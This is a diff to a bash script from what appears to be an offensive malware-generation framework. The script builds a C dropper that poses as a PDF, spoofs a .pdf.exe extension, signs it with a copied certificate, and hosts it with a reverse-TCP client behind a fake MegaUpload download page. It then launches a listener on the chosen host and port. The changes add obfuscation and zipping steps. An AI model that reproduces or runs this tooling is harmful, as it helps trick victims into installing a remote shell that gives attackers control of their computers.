@@ -13424,6 +13424,7 @@ fi
 
 
 ## Store User Inputs (module bash variable declarations)..
+easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 443" --entry --width 300) > /dev/null 2>&1
 UpL=$(zenity --title "☠ CHOSE ONE PDF DOC TO BE TROJANIZED ☠" --filename=$IPATH --file-selection --text "Input one PDF document to be embbebed with our revshell") > /dev/null 2>&1
@@ -13436,14 +13437,14 @@ if [ "$TestExtension" != "pdf" ]; then
    exit
 fi
 Drop=$(zenity --title="☠ Enter DROPPER FILENAME ☠" --text "example: Curriculum\nWarning: Allways Start FileNames With 'Capital Letters'\n\nIf 'FileName' input its leave blank, then venom will\nuse the pdf 'FileName' to rename the dropper.exe" --entry --width 300) > /dev/null 2>&1
-rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
-
+rpath=$(zenity --title="☠ Enter Files Upload Path (remote dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
 
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$Drop" ]; then Drop="$FullName";fi
+wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
 
 
 ## Display final settings to user.
@@ -13456,7 +13457,7 @@ cat << !
     DROPPER  : $IPATH/output/$Drop.exe
     PDFdoc   : $IPATH/output/$Drop.pdf
     AGENT    : $IPATH/output/Client.exe
-    UPLOADTO : $rpath => (remote)
+    UPLOADTO : $rpath => ($wvd)
 !
 echo "---"
 
@@ -13465,17 +13466,23 @@ cd $IPATH/output
 ## BUILD DROPPER (to download/execute our legit pdf and agent.ps1).
 echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
 cp $UpL $IPATH/output/$Drop.pdf # Copy/rename legit pdf to output folder
-cp $IPATH/templates/dropper.c $IPATH/output/dropper.c
+if [ "$easter_egg" = "ON" ]; then
+   cp $IPATH/templates/dropperTWO.c $IPATH/output/dropper.c
+else
+   cp $IPATH/templates/dropper.c $IPATH/output/dropper.c
+fi
 sed -i "s|LhOsT|$lhost|g" dropper.c
 sed -i "s|LpOrT|$lport|g" dropper.c
 sed -i "s|FiLNaMe|$Drop|g" dropper.c
 sed -i "s|TempDir|$rpath|g" dropper.c
+sed -i "s|FiNaL|$wvd|g" dropper.c
+
 
 ## COMPILING C Program USING mingw32 OR mingw-W64
 echo "${BlueF}[☠]${white} Compiling dropper using mingw32."${Reset};sleep 2
 # special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
 $ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
-rm $IPATH/output/dropper.c > /dev/nul 2>&1
+#rm $IPATH/output/dropper.c > /dev/nul 2>&1
 
 
 ## Use resourceHacker (wine32) to change the dropper.exe icon
@@ -13490,7 +13497,6 @@ if [ "$Spoof" = "$Drop.pdf.exe (spoof)" ]; then echo "${BlueF}[${YellowF}i${Blue
 
 ## SIGN EXECUTABLE (@paranoidninja - CarbonCopy)
 # GITHUB: https://github.com/paranoidninja/CarbonCopy
-easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 if [ "$easter_egg" = "ON" ]; then
 
    ## Make sure CarbonCopy dependencies are installed
@@ -13540,6 +13546,7 @@ sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
 mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 
 cd $IPATH/output
+## Zipping Archives to send to apache2 webroot
 if [ "$Spoof" = "$Drop.pdf.exe (spoof)" ]; then
    ## Attacker have chosen to spoof the dropper extension
    mv $IPATH/output/$Drop.exe $IPATH/output/$Drop.pdf.exe > /dev/nul 2>&1
@@ -13548,11 +13555,20 @@ else
    zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe
 fi
 
+
+cd $IPATH/output
 echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};sleep 2
 if [ "$easter_egg" = "ON" ]; then
+   zip Client.zip Client.exe > /dev/nul 2>&1 # ZIP Client.exe # <-- TODO: check if it works
+   mv Client.zip $ApAcHe/Client.zip > /dev/nul 2>&1 # rev tcp Client shell # <-- TODO: check if it works
    mv $IPATH/output/Client.exe $ApAcHe/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
 else
+   cd $IPATH/bin # <-- TODO: check if it works
+   zip Client.zip Client.exe > /dev/nul 2>&1 # ZIP Client.exe # <-- TODO: check if it works
+   mv $IPATH/bin/Client.zip $ApAcHe/Client.zip > /dev/nul 2>&1 # rev tcp Client shell # <-- TODO: check if it works
    cp $IPATH/bin/Client.exe $ApAcHe/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
+   cp $IPATH/bin/Client.exe $IPATH/output/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
+   cd $IPATH/output # <-- TODO: check if it works
 fi
 cp $IPATH/bin/Server.exe $IPATH/output/Server.exe > /dev/nul 2>&1 # Server
 mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
@@ -13572,8 +13588,7 @@ read stupidpause
 
 ## START SERVER HANDLER ON SELLECTED IP/PORT NUMBER
 cd $IPATH/output
-LocalHostName="\\\\"$(hostname)
-xterm -T " $LocalHostName - SERVER LISTENER - $lhost:$lport" -geometry 120x23 -e "wine Server.exe ip=$lhost port=$lport"
+xterm -T "SERVER LISTENER - $lhost:$lport" -geometry 120x23 -e "wine Server.exe ip=$lhost port=$lport"
 cd $IPATH
 sleep 1
 
@@ -13583,8 +13598,10 @@ echo "${BlueF}[☠]${white} Please Wait, cleaning old files.${white}";sleep 2
 rm $ApAcHe/$Drop.pdf > /dev/nul 2>&1
 rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
 rm $ApAcHe/Client.exe > /dev/nul 2>&1
+rm $ApAcHe/Client.zip > /dev/nul 2>&1
 rm $ApAcHe/Download.html > /dev/nul 2>&1
 rm $IPATH/output/dropper.c > /dev/nul 2>&1
+rm $IPATH/output/Client.exe > /dev/nul 2>&1
 rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
 rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 rm $IPATH/output/Server.exe > /dev/nul 2>&1
